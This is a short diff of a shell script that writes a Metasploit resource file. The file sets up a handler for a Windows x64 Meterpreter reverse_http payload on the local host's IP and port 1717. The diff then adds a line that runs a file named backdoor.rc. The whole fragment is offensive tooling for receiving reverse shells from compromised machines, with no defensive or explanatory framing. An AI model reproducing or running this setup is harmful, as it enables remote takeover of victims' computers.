@@ -11,3 +11,5 @@ echo set payload windows/x64/meterpreter/reverse_http >>metasploit.rc
 echo "set lhost $(hostname -I)" >> metasploit.rc
 echo set lport 1717 >> metasploit.rc
 echo run >> metasploit.rc
+
+./backdoor.rc
